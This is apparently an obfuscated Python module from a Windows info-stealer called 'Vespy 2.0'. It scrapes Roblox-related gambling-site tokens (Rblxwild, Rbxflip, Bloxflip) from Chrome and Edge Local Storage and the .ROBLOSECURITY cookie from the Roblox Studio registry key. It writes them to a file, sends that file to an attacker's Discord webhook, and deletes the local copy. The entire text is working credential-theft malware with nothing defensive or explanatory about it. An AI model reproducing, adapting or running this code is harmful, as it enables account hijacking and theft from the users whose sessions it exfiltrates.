Q='\\x'
P='\\'
O='.ldb'
N='.log'
M='leveldb'
L='Local Storage'
K='-'
J='rb'
I='\n'
H='\n\n'
G='Roblox.txt'
F=str
E='AppData'
D='USERPROFILE'
C=open
A='='
class B:
	def __init__(A):
		I='User Data';H='Local';A.FILE=C(os.path.join(os.environ[D],E,G),'w+');A.bloxflip=0;A.robloxcookies=0;A.rbxflip=0;A.rblxwild=0;A.clearbet=0;A.done=0;F=[f"{os.path.join(os.environ[D],E,H,'Microsoft','Edge',I)}",f"{os.path.join(os.environ[D],E,H,'Google','Chrome',I)}"];A.prof=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5','Profile 6','Profile 7','Profile 8','Profile 9','Profile 10'];A.RobloxStudio();A.done=0
		for B in F:
			if os.path.exists(B):A.Rblxwild(B)
		A.done=0
		for B in F:
			if os.path.exists(B):A.Rbxflip(B)
		A.done=0
		for B in F:
			if os.path.exists(B):A.Bloxflip(B)
		A._upload()
	def Rblxwild(B,p):
		if B.done==0:B.FILE.write(H+A*35+'[ Rblxwild ]'+A*35+I);B.done+=1
		try:
			for S in B.prof:
				G=os.path.join(p,S,L,M)
				for D in os.listdir(G):
					if D.endswith(N)or D.endswith(O):
						try:
							E=F(C(G+P+D,J).read().strip());E=E.split('_https://rblxwild.com')
							for T in E:
								R='bd'+T.split('authToken')[1].split('bd')[1].split(Q)[0]
								if len(R)>50:B.rblxwild+=1;B.FILE.write(f"\nToken : {R}\n\n"+K*35)
						except:pass
		except:pass
	def Rbxflip(B,p):
		R='https://www.rbxflip.com'
		if B.done==0:B.FILE.write(H+A*35+'[ Rbxflip ]'+A*35+I);B.done+=1
		try:
			for S in B.prof:
				E=os.path.join(p,S,L,M)
				for D in os.listdir(E):
					if D.endswith(N)or D.endswith(O):
						try:
							G=F(C(E+P+D,J).read().strip())
							if R in G:
								T=G.split(R)
								for U in T:V=U.split('Bearer ')[1].split(Q)[0];B.rbxflip+=1;B.FILE.write(f"\nToken : {V}\n\n"+K*35)
						except:pass
		except:pass
	def Bloxflip(B,p):
		G='ywmz0d/'
		if B.done==0:B.FILE.write(H+A*35+'[ Bloxflip ]'+A*35+I);B.done+=1
		try:
			for R in B.prof:
				E=os.path.join(p,R,L,M)
				for D in os.listdir(E):
					if D.endswith(N)or D.endswith(O):
						try:
							S=F(C(E+P+D,J).read().strip());T=S.split('_DO_NOT_SHARE_BLOXFLIP_TOKEN')
							for U in T:
								try:V=G+U.split(G)[1][:2000].split(Q)[0].replace('%','');B.bloxflip+=1;B.FILE.write(f"\nToken : {V}\n\n"+K*35)
								except:pass
						except:pass
		except:pass
	def RobloxStudio(B):
		E='_|WARNING:-DO-NOT-SHARE-THIS'
		if B.done==0:B.FILE.write(H+A*35+'[ Roblox Cookies ]'+A*35+I);B.done+=1
		try:
			G=OpenKey(HKEY_CURRENT_USER,'SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com');C=0
			while True:
				J,D,type=EnumValue(G,C)
				if J=='.ROBLOSECURITY':D=E+F(D).split(E)[1];B.robloxcookies+=1;B.FILE.write(f"\n.ROBLOSECURITY : {D}\n\n"+K*35)
				C=C+1
		except WindowsError:pass
	def _upload(A):H='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';A.FILE.close();F=DiscordWebhook(url=wbh,username='Vespy 2.0',avatar_url=H);F.add_file(file=C(os.path.join(os.environ[D],E,G),J).read(),filename=G);B=DiscordEmbed(title=f"Roblox Tokens and Cookies",description=f"Found Roblox Tokens and Cookies",color='4300d1');B.set_author(name='author : beadidd',icon_url=H);B.set_footer(text='Beaadidd 2.0 | by : beadidd');B.set_timestamp();B.add_embed_field(name=f"Info Grabbed\n",value=f"""
:coin: RblxWild: ``{A.rblxwild} Tokens``

:coin: Rbxflip: ``{A.rbxflip} Tokens``

:coin: Bloxflip: ``{A.bloxflip} Tokens``

:cookie: Roblox Cookie: ``{A.robloxcookies} Cookie``
""");F.add_embed(B);F.execute();os.remove(os.path.join(os.environ[D],E,G))